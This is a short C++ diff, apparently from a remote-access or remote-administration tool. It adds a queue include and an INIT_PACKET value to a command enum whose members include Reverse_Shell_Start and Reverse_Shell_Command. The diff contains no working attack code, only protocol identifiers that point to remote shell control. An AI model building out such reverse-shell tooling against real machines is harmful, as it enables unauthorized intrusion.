@@ -46,6 +46,7 @@
 #include<sstream>
 #include<string>
 #include<vector>
+#include<queue>
 #include<cstring>
 #include<ctime>
 #include<mmsystem.h>
@@ -152,7 +153,8 @@ namespace EnumMenuFM {
 
 namespace EnumComandos {
     enum Enum {
-        PONG = 499,
+        INIT_PACKET = 498,
+        PONG,
         PING,
         Reverse_Shell_Start,
         Reverse_Shell_Command,
